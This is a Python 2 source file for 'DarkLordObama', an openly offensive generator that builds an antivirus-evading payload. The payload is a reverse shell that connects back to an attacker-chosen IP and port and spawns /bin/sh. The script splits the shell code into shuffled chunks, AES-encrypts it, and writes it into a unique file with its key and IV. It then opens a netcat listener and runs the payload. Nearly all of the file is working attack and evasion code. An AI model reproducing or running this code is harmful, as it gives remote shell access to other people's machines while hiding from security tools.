#!/usr/bin/python
# -*- coding: utf-8 -*-

# Author: Chang Tan Lister
# Product of Lister Unlimited Cybersecurity Solutions, LLC
# 702-886-8952

import re,random,string,Crypto,binascii,base64,sys,os,time,subprocess
from Crypto.Cipher import AES
from binascii import hexlify
from base64 import b64decode, b64encode
import Evasion
from Evasion import readPayloadTemplate,findIndexValue, commandSegmentationTech,reconstituteLine,reconstitutePayload,template_reverse_shell
import toolkits
from toolkits import red, green, yellow, cyan
import json


arrayList = []
def fillList(arrayBrokenShellCode,toFill):
    for i in range(0,toFill):
        arrayBrokenShellCode.append("aa")
    return arrayBrokenShellCode
def generateArrayList(l):
    arrayBrokenShellCode = re.findall('..?',l)
    arrayBSOrig = list(arrayBrokenShellCode)
    toFill = 50 - len(arrayBrokenShellCode)
    arrayBrokenShellCode = fillList(arrayBrokenShellCode,toFill)
    arrayShuffled = random.sample(arrayBrokenShellCode,len(arrayBrokenShellCode))
    for i in arrayShuffled:
        if i == 'aa' or None:
            char = ''.join(random.choice(string.ascii_lowercase) for i in range(2))
            arrayShuffled[arrayShuffled.index(i)] = char
    return arrayShuffled,arrayBSOrig
scmap = []
def remap(arrayBSOrig,arrayShuffled):
    for word in arrayBSOrig:
        mapped = arrayShuffled.index(word)
        scmap.append(mapped)
    return scmap
def reconstituteSC(arrayShuffled,scmap):
    cmd=""
    for index in scmap:
        cmd += arrayShuffled[index]
    cmd = cmd.strip().rstrip()
    # print "Executing Command:\r\n{}".format(str(cmd))
    exec(cmd)
    return cmd

def reconstituteOrig(arrayBSOrig):
    shell=[]
    for x in arrayBSOrig:
        cmd = ""
        try:
            cmd = "".join(x)
            shell.append(cmd)
        except:
            pass
    # print shell
    for c in shell:
        cmd = c
        # print "Executing Command:\r\n{}".format(str(cmd))
        exec(cmd)
    return

def generateKey(size=32,chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for x in range(size))

def generateIV(size=16,chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for x in range(size))
def cryptor(shellcommands, key, IV):
    shellcommands = str(shellcommands)
    obj = AES.new(key,AES.MODE_CFB,IV)
    ciphertext = obj.encrypt(shellcommands)

    return ciphertext

def safeDecryptShellCommands(ciphertext, key, IV):
    obj3 = AES.new(key,AES.MODE_CFB,IV)
    plainTextCmd = obj3.decrypt(ciphertext)

    return plainTextCmd

def writePayloadToFile(l_encrypted):
    out = l_encrypted
    payload = 'payload.txt'
    w = open(payload,'w+')
    w.write(out)
    w.close()

    return payload

def executeEncryptedPayload(payload,decryptKey,decryptIV):
    r = open(payload,'r+')
    cryptedPayload = r.read()
    r.close()
    x = safeDecryptShellCommands(cryptedPayload,decryptKey,decryptIV)
    lines = x.splitlines()

    return lines

# Startup
banner = """
# DarkLordObama: Undetectable (as of July 28th, 2019) Pythonic Payload Generator
# Author: Chang Tan Lister
# Product of Lister Unlimited Cybersecurity Solutions, LLC
# Services provided: Low-interest loans to Cybersecurity/IT Companies, Securities-Trading (Corporate Bonds), Penetration Tests, Cyber Liability Coverage Plans (Requires pentest before a quote can be devised)
# 702-886-8952
"""
print banner
if len(sys.argv) < 3:
    print "Usage\r\npython generator.py <IPAddr> <Port>"
    exit(0)
else:
    LHOST=str(sys.argv[1])
    LPORT=int(sys.argv[2])

template_reverse_shell = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{}",{}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
""".format(
    str(LHOST),
    int(LPORT)
)
timestr = time.strftime("%Y%m%d-%H%M%S")
payload2="darklordobama_{}.py".format(str(timestr))
template_reverse_shell = template_reverse_shell.strip().rstrip()
### DEBUGGING OUTPUT ###
# root@kali-rolling-amd64:~/Documents/DarkLordObama-Dev# python
# Python 2.7.16+ (default, Jul  8 2019, 09:45:29) 
# [GCC 8.3.0] on linux2
# Type "help", "copyright", "credits" or "license" for more information.
# >>> arr1=['a']
# >>> arr2=[1]
# >>> dictionary=arr1,arr2
# >>> import json
# >>> exDict = {'exDict': exDict}
# Traceback (most recent call last):
#   File "<stdin>", line 1, in <module>
# NameError: name 'exDict' is not defined
# >>> exDict = {'exDict': dictionary}
# >>> with open('test.txt','w') as file:
# ...  file.write(json.dumps(exDict))
# ... 
# >>> r = open('test.txt','r')
# >>> lines = r.readlines()
# >>> lines
# ['{"exDict": [["a"], [1]]}']
# >>> 

def writeUniquePayload(code,l_encrypted,decryptKey,decryptIV,outfile=payload2):
    cmd = "touch {}".format(str(outfile))
    subprocess.call(cmd,shell=True,executable='/bin/bash')
    out = b64encode(l_encrypted)
    w = open(outfile,'wb+')
    c = code.splitlines()
    for line in c:
        # Add unique key
        if 'key=' in line:
            kline = 'key="""{}"""'.format(str(decryptKey))
            line = line.replace('key=',kline)
        # Add unique Initialization Vector
        if 'iv=' in line:
            ivline = 'iv="""{}"""'.format(str(decryptIV))
            line = line.replace('iv=',ivline)
        # Add unique Encrypted Payload
        # This will not do. We need to write a entire dictionary object into it
        if 'pld=' in line:
            pldline1 = 'pld=str("""'
            pldline2 = "{}".format(str(out))
            pldline3 = '""")'
            pldline = """
{}
{}
{}
            """.format(
                str(pldline1),
                str(pldline2),
                str(pldline3)
            )
            line = line.replace('pld=',pldline)
        # Write all lines whether or not they need to be rewritten
        w.write('\r\n'+line)
    # Save the file as outfile.py
    w.close()
    cmd = "ls $PWD/{}".format(str(outfile))
    of = subprocess.Popen(cmd,shell=True,executable='/bin/bash',stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    ofile = str(of.stdout.read().encode('utf-8')).strip().rstrip()
    # cmd = "pyobfuscate {0} 2>&1 | tee {0}_payload.py;rm {0}".format(str(ofile))
    print "Payload saved at:\r\n{}".format(str(ofile))
    return outfile
def read_template(template="./payload_template.py"):
    r = open(template,'rb+')
    code = r.read()
    r.close()
    return code

def writeIntermediaryFile(shuffledPayload):
    exDict = {'exDict': shuffledPayload}

    with open('intermediary.txt','w+') as interFile:
        interFile.write(json.dumps(exDict))
        interFile.close()
    return interFile

def shredIntermediaryFile(interFile):
    cmd = "shred {}".format(str(interFile))
    p = subprocess.Popen(cmd,shell=True,executable='/bin/bash',stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    print yellow("DEBUG: function=shredIntermediaryFile(interFile) ran \r\n\t".format(str(cmd)))
    return
def readIntermediaryFile(interFile):
    r = open(interFile,'rb+')
    shuffledPayload = str(r.read()).strip().rstrip()
    print yellow("DEBUG: function=readIntermediaryFile(interFile) contents\r\n{}".format(str(shuffledPayload)))
    r.close()
    shredIntermediaryFile(interFile)
    return shuffledPayload

def convertIntoLines(shuffledPayload):
    writableLines = []
    for k in shuffledPayload:
        shuffledLine = shuffledPayload[k][0]
        arrayMap = shuffledPayload[k][1]
        writableLine = '{},{}\r\n'.format(str(shuffledLine),str(arrayMap))
        writableLines.append(writableLine)
    
    return writableLines
def main():
    decryptKey = generateKey()
    decryptIV = generateIV()
    code = read_template()
    template_reverse_shell

    payloadNoEncrypt = template_reverse_shell.splitlines()
    shuffledPayload = commandSegmentationTech(payloadNoEncrypt)
    writableLines = convertIntoLines(shuffledPayload)
    # interFile = writeIntermediaryFile(shuffledPayload)
    # shuffledPayload = readIntermediaryFile(interFile)
    l_encrypted = cryptor(shuffledPayload,decryptKey,decryptIV)
    outfile = writeUniquePayload(code,l_encrypted,decryptKey,decryptIV)
    print red("DEBUG: Shuffled payload\r\n{}".format(str(shuffledPayload)))
    out = b64encode(l_encrypted)
    print yellow("DEBUG: Encrypted payload\r\n{}".format(str(out)))
    print green("DEBUG: Payload generated at\r\n{}".format(str(outfile)))
    rp = open(outfile,'rb+')
    uniquePayload = rp.read()
    print red("DEBUG: Contents of {}\r\n".format(str(outfile)))
    print yellow(uniquePayload)
    print cyan("Opening netcat session")
# os.system("gnome-terminal -e 'bash -c \"python /root/ArmsCommander/wirelessattacks/Cylon-Raider/CrackHead_Recon.py; exec bash\"'")
    os.system("""gnome-terminal -e 'bash -c "nc -nvlp {}"'""".format(str(LPORT)))
    print green("You may run the payload with\r\npython {}".format(str(outfile)))
    time.sleep(2)
    print green("Executing payload")
    os.system("python {}".format(str(outfile)))
    return
main()
# def main():
#     decryptKey = generateKey()
#     decryptIV = generateIV()
#     code = read_template()
#     l_encrypted = cryptor(template_reverse_shell,decryptKey,decryptIV)
#     outfile = writeUniquePayload(code,l_encrypted,decryptKey,decryptIV,outfile=payload2)
#     payload = writePayloadToFile(l_encrypted)
#     out = b64encode(l_encrypted)
#     # print "DEBUG:\r\n{}".format(str(out))
#     lines = executeEncryptedPayload(payload,decryptKey,decryptIV)
#     # print "DEBUG:\r\n{}".format(str(lines))

#     for l in lines:
#         arrayShuffled, arrayBSOrig = generateArrayList(l)
#         scmap = remap(arrayBSOrig,arrayShuffled)

#         for l in lines:
#             array = re.findall('..?',l)
#             # print array
#             cmd = "".join(array)
#             # print "Reconstituted:\r\n",cmd
#             exec(cmd)
#     return
# main()
